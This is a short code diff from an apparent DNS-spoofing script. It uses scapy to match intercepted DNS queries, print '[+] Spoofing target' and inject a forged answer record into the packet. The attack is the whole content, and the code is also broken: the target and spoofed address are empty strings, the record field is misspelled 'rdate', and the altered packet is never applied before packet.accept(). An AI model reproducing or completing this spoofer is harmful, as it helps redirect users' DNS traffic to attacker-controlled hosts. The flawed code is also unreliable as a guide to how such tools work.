@@ -9,6 +9,8 @@ def process_packet(packet):
         if "" in qname:
             print("[+] Spoofing target")
             answer = scapy.DNSRR(rrname=qname, rdate="")
+            scapy_packet[scapy.DNS].an = answer
+            scapy_packet[scapy.DNS].ancount = 1
 
     packet.accept() 
 
